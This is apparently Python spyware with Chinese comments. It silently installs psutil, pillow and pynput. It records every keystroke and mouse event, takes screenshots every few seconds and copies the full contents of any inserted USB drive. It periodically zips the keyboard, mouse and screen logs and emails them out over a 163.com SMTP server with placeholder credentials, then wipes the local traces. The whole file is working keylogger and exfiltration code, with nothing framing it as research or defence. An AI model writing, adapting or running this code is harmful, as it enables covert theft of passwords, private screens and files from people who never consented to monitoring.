import time,os,re,sys,shutil,pickle,zipfile
import smtplib
import email.mime.text
import email.mime.multipart
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import multiprocessing as mp
try:
    import psutil
except ModuleNotFoundError:
    os.system('"%s\\python.exe" -m pip install psutil --user'%os.path.dirname(sys.executable))
    import psutil
try:
    from PIL import ImageGrab
except ModuleNotFoundError:
    os.system('"%s\\python.exe" -m pip install pillow --user'%os.path.dirname(sys.executable))
    from PIL import ImageGrab
try:
    from pynput import keyboard,mouse
except ModuleNotFoundError:
    os.system('"%s\\python.exe" -m pip install pynput --user'%os.path.dirname(sys.executable))
    from pynput import keyboard,mouse

location1='d:/截获/屏幕/'
location2='d:/截获/驱动器/'
location3='d:/截获/鼠标键盘/'
try:
    os.makedirs(location1)
except:
    pass
try:
    os.makedirs(location2)
except:
    pass
try:
    os.makedirs(location3)
except:
    pass

def get_type_file(keyword='.txt'): # 这里可以更改扩展名如.doc,.py,.zip等等
    # 打印当前的工作目录
    print("当前目录为: ",os.getcwd())

    # 列举当前工作目录下的文件名
    files=os.listdir()
    keyword=keyword
    filelist=[]

    i=0
    for file in files:
        if keyword in file:
            i=i+1
            print(i,file)
            filelist.append(file)

    return filelist

def send_email(smtpHost,sendAddr,password,receiver,subject,content,filelist):
    msg = MIMEMultipart()
    msg['from'] = sendAddr
    msg['to'] = receiver
    msg['Subject'] = subject
    txt = MIMEText(content, 'plain', 'utf-8')
    msg.attach(txt)  # 添加邮件正文
    # 添加附件,传送filelist列表里的文件
    filename = ""
    i = 0
    for file in filelist:
        i = i + 1
        filename = file
        # print(str(i),filename)
        part = MIMEApplication(open(filename, 'rb').read())
        part.add_header('Content-Disposition', 'attachment', filename=filename)
        msg.attach(part)
    server = smtplib.SMTP(smtpHost, 25)  # SMTP协议默认端口为25
    # server.set_debuglevel(1)  # 出错时可以查看
    server.login(sendAddr, password)
    server.sendmail(sendAddr, receiver, str(msg))
    #print("\n"+ str(len(filelist)) + "个文件发送成功")
    server.quit()

def createZip(filePath,saveName='test.zip'):
    fileList=[]
    newZip = zipfile.ZipFile(saveName,'w')
    for dirpath,dirnames,filenames in os.walk(filePath):
        for filename in filenames:
            fileList.append(os.path.join(dirpath,filename))
    for tar in fileList:
        newZip.write(tar,tar[len(filePath):])
    newZip.close()

def unZip(filePath,unzipPath='',password=None):
    file = zipfile.ZipFile(filePath)
    file.extractall(unzipPath,pwd=password.encode("ascii"))

def process(x):
    p=psutil.process_iter()
    for item in p:
        r=str(item)
        if re.search(x,r):
            return 1
    else:
        return 0

def getFileSize(filePath, size=0):
    for root, dirs, files in os.walk(filePath):
        for f in files:
            size += os.path.getsize(os.path.join(root, f))
            #print(f)
    return size

def updata():
    global local_device,local_letter,local_number,\
        mobile_device,mobile_letter,mobile_number
    #引入全局变量
    tmp_local_device,tmp_local_letter = [],[]
    tmp_mobile_device,tmp_mobile_letter = [],[]
    tmp_local_number,tmp_mobile_number = 0,0
    try:
        part = psutil.disk_partitions()
    except:
        print("程序发生异常!!!")
        sys.exit(-1)
    else:
        #* 驱动器分类
        for i in range(len(part)):
            tmplist = part[i].opts.split(",")
            if tmplist[1] == "fixed":                       #挂载选项数据内读到fixed = 本地设备
                tmp_local_number = tmp_local_number + 1
                tmp_local_letter.append(part[i].device[:2])     #得到盘符信息
                tmp_local_device.append(part[i])
            else:
                tmp_mobile_number = tmp_mobile_number + 1
                tmp_mobile_letter.append(part[i].device[:2])
                tmp_mobile_device.append(part[i])
        #*浅切片
        local_device,local_letter = tmp_local_device[:],tmp_local_letter[:]
        mobile_device,mobile_letter = tmp_mobile_device[:],tmp_mobile_letter[:]
        local_number,mobile_number = tmp_local_number,tmp_mobile_number
    return len(part)                                        #返回当前驱动器数

def print_device(n):
    global local_device,local_letter,local_number,\
        mobile_device,mobile_letter,mobile_number
    print("=" * 50 + "\n读取到" + str(n) + "个驱动器")
    for l in range(local_number):
        print(local_letter[l],end="")                   #列出本地驱动器盘符
    print("{" + local_device[0].opts + "}")
    if(len(mobile_device)):                           #列出移动驱动器盘符
        for m in range(mobile_number):
            print(mobile_letter[m],end="")
        print("{" + mobile_device[0].opts + "}")
    else:
        None
    print("进程进入监听状态 " + "*" * 10)
    return mobile_letter

def file_copy(hh,name):
    try:
        shutil.copytree('%s/'%hh,'%s%s/%s'%(location2,name,hh[:-1]))
    except:
        pass

def file_remove():
    file_size=getFileSize(location2)
    if file_size>=100*1024**3:
        shutil.rmtree('%s%s'%(location2,min(os.listdir(location2))))

def on_press(key):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    try:
        with open('%s键盘.txt'%location3,'a') as f_obj:
            f_obj.write(f'{name}\t字母按下:{key.char}\n')
    except AttributeError:
        with open('%s键盘.txt'%location3,'a') as f_obj:
            f_obj.write(f"{name}\t特殊键按下:{str(key).split('.')[1]}\n")

def on_release(key):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    try:
        with open('%s键盘.txt'%location3,'a') as f_obj:
            f_obj.write(f'{name}\t字母释放:{key.char}\n')
    except AttributeError:
        with open('%s键盘.txt'%location3,'a') as f_obj:
            f_obj.write(f"{name}\t特殊键释放:{str(key).split('.')[1]}\n")

def move(x,y):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    with open('%s鼠标.txt'%location3,'a') as f_obj:
        f_obj.write(f'{name}\t鼠标位置:{(x,y)}\n')

def click(x,y,button,pressed):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    with open('%s鼠标.txt'%location3,'a') as f_obj:
        f_obj.write(f"{name}\t{'按下' if pressed else '释放'}{str(button).split('.')[1]}:{(x,y)}\n")

def scroll(x,y,dx,dy):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    with open('%s鼠标.txt'%location3,'a') as f_obj:
        f_obj.write(f"{name}\t鼠标滚轮:{'向下' if dy<0 else '向上'}{(x,y)}\n")

def screen_jk():
    i=0
    Max=200
    pro='explorer'
    while 1:
        a=process(pro)
        print(a)
        if a==1:
            i=len(os.listdir(location1))
            if i>=int(Max):
                while 1:
                    os.remove('%s%s'%(location1,min(os.listdir(location1))))
                    i=len(os.listdir(location1))
                    if i==Max-1:break
            print(pro+"已开启")
            im=ImageGrab.grab((0,0,1920,1080))
            tim=time.localtime()
            name='%02d_%02d_%02d_%02d_%02d.jpg'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
            im.save(location1+name,'JPEG')
            print(time.ctime()+"图片保存")
            time.sleep(5)
            
        else:
            print(pro+"关闭")
            time.sleep(20)

def usb_jk():
    local_device = []                   #本地驱动器
    local_letter = []                   #本地盘符
    local_number = 0                    #本地驱动器数
    mobile_device = []                  #移动设备
    mobile_letter = []                  #移动设备盘符
    mobile_number = 0                   #移动设备数      
    mbqd=[]
    #*初次读取驱动器信息，打印驱动器详细
    now_number = 0                  #实时驱动数
    before_number = updata()        #更新数据之前的驱动数
    #print_device(before_number)
    #进程进入循环 Loop Seconds = 1s
    while True:
        try:
            now_number = updata()
        except IndexError:
            continue
            print('索引超限')
        if(now_number > before_number):
            print("检测到移动磁盘被插入...")
            a=print_device(now_number)
            tim=time.localtime()
            name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
            for hh in a:
                if hh not in mbqd:
                    mp.Process(target=file_copy, args=(hh,name)).start()
                    mbqd.append(hh)
            before_number = now_number                  #刷新数据
        elif(now_number < before_number):
            print("检测到移动磁盘被拔出...")
            a1=print_device(now_number)
            for xx in a:
                if xx not in a1:
                    try:
                        mbqd.remove(xx)
                    except:
                        pass
            mp.Process(target=file_remove).start()
            before_number = now_number
        time.sleep(1)

def keyboard_jk():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

def mouse_jk():
    with mouse.Listener(
            on_move=move,
            on_click=click,
            on_scroll=scroll) as listener:
        listener.join()

def start_all():
    p1 = mp.Process(target=screen_jk)
    p2 = mp.Process(target=usb_jk)
    p3 = mp.Process(target=keyboard_jk)
    p4 = mp.Process(target=mouse_jk)
    p1.start()
    p2.start()
    p3.start()
    p4.start()
    while 1:
        time.sleep(1000)
        createZip(r"d:\截获\鼠标键盘","IOstream.zip")
        createZip(r"d:\截获\屏幕","Screen.zip")
        try:
            send_email('smtp.163.com','用于发送的邮箱','邮箱密码','用于接收的邮箱',"主题","正文内容",["IOstream.zip","Screen.zip"])
            os.remove("IOstream.zip")
            os.remove("Screen.zip")
        except:
            pass
        try:
            with open('%s鼠标.txt'%location3,'w') as f_obj:
                f_obj.write('')
        except:
            pass
        try:
            with open('%s键盘.txt'%location3,'w') as f_obj:
                f_obj.write('')
        except:
            pass

if __name__ == '__main__':
    if not os.path.isfile('tj.zo'):
        with open('tj.zo','wb') as f_obj:
            pickle.dump(['lllllll'],f_obj)
        tjj=1
    else:
        with open('tj.zo','rb') as f_obj:
            zz=pickle.load(f_obj)
            print(zz)
            if zz==['lllllll']:
                tjj=0 #令一个正在运行，关闭，清空
            else:
                with open('tj.zo','wb') as f_j:
                    pickle.dump(['lllllll'],f_j)
                tjj=1
    if tjj==1:
        start_all()
    else:
        with open('tj.zo','wb') as f_obj:
            pickle.dump(['bbbbbbb'],f_obj)
        os.system('TASKKILL /F /IM pythonw.exe /T')
